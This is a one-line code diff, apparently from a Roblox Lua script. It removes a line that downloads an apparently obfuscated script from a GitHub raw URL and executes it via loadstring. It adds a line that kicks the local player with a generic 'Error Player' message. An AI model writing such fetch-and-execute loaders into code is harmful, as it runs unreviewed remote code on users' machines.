@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Juanko-Scripts/Roblox-scripts/main/Protected_2233260151215278.txt"))()
+game:GetService("Players").LocalPlayer:Kick("Error Player")
